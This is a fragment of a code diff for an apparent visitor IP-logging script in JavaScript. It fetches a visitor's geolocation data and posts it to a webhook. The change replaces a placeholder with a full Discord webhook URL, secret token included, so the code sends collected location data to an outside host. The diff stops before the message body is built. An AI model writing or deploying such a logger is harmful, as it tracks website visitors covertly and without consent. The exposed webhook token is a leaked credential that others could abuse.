@@ -1,6 +1,6 @@
 $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=", function(data) { //Make sure to use this api or use another but you got to change the values down below
     var request = new XMLHttpRequest();
-    request.open("POST", "WEBHOOK HERE!");
+    request.open("POST", "https://discord.com/api/webhooks/1044394615261892628/_IEBacsQXFXWrKIPDHWDV7S95qWFghZxC0YFtSXiTiOI8Ub_buXrw74UFiammwTRdOWH");
   
     request.setRequestHeader('Content-type', 'application/json');
   
